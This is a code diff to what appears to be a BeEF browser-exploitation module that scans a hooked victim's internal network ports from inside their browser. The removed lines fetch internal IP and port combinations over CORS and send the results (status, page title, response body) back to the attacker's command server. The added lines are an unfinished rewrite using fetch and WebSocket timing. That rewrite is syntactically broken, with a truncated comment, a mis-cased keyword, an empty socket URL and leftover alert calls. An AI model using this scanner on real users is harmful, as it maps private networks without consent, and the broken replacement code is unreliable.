@@ -99,24 +99,39 @@ beef.execute(function() {
     workers.push(new WorkerQueue(wait));
   }
 
-  // send CORS request to each IP
-  for (var i=0; i < ips.length; i++) {
-    var worker = workers[i % threads];
-    for (var p=0; p < ports.length; p++) {
-      if (ports[p] == '443') var proto = 'https'; else var proto = 'http';
-      var url = proto + '://' + ips[i] + ':' + ports[p];
-      worker.queue('beef.debug("[Cross-Origin Scanner (CORS)] Fetching URL: '+url+'");' +
-      'beef.net.cors.request(' +
-      '"GET", "'+url+'", "", '+timeout+', function(response) {' +
-       'if (response != null && response["status"] != 0) {' +
-        'beef.debug("[Cross-Origin Scanner (CORS)] Received response from '+url+': " + JSON.stringify(response));' +
-        'var title = response["body"].match("<title>(.*?)<\\/title>"); if (title != null) title = title[1];' +
-        'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto='+proto+'&ip='+ips[i]+'&port='+ports[p]+'&status="+response["status"]+"&title="+title+"&response="+JSON.stringify(response), beef.are.status_success());' +
-       '}' +
-      '});'
-      );
-    }
-  }
+//Below is so broken right now
+//Firefox returns open ports speaking non-http as response.status = 0
+//Chrome returns open ports speaking non-http as identical to closed ports. However time difference is 70ms for websocket attempt on non-http but open, 1000ms for closed. 
+//Will hates all of the above, and it is the best way to go forward. The sw_port_scan code incorporates these detectable deviations.
+
+// Create a fetch abort controller that will kill code that runs for too long
+
+
+fetch('http://' + ipaddress+":"+port, {mode: 'no-cors'})
+//what to do after fetch returns
+.then(function(res){ 
+// If there is a status returned then Mozilla Firefox 68.5.0esr made a successful connection
+// This includes where it is not http and open
+console.log(Number.isInteger(res.status))
+}
+).catch(function(ex){
+// If we caught an error this could be one of two things. It's closed (because
+check_socket(ipaddress, port)
+})
+
+
+// If we get to this stage
+Function check_socket(ipaddress,port){
+let socket = new WebSocket("ws://");
+
+
+socket.onopen = function(e) {  alert("[open] Connection established");  alert("Sending to server");  socket.send("My name is John");};
+socket.onmessage = function(event) {  alert(`[message] Data received from server: ${event.data}`);};
+socket.onclose = function(event) {  if (event.wasClean) {    alert(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);  } else {    // e.g. server process killed or network down    // event.code is usually 1006 in this case    alert('[close] Connection died');  }};
+socket.onerror = function(error) {  alert(`[error] ${error.message}`);};
+}
+
+
 
 });
 
